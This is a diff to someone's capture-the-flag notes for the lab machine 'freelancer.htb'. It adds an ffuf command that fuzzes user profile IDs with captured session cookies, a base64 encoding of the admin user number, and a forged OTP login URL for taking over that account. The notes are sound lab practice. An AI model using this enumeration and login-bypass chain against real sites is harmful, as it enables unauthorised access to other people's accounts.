@@ -53,6 +53,14 @@ Replace path_to_qr_code_image.png with the actual path to your QR code image and
 #Linux command to generate numbers from 1 to 65535 and redirect them to a file
 seq 1 65535 > numbers.txt
 ==========(3)======================================================================================================================
-#Use BurpSuite to find sessionid and csrftoken
+#Use BurpSuite to find sessionid and csrftoken and then use it for FUZZ
 ffuf -u 'http://freelancer.htb/accounts/profile/visit/FUZZ/' -X GET -H 'Cookie: sessionid=4p6yyd6c1zosaiuqzfvm3xuu9nr8k08g;csrftoken=uClh0dyORb2wtB2zqDYdxc6YZuGftsE5' -w /home/mabali/numbers.txt -v
+==========(4)======================================================================================================================
+#find the admin page and convert page number to base64
+printf "%d" 2 | base64
+==========(5)======================================================================================================================
+#use scanqr code to get link content
+echo "http://freelancer.htb/accounts/login/otp/Mg==/43c1fd8315d35368f280e7298fdab3a8/"
+
+
 
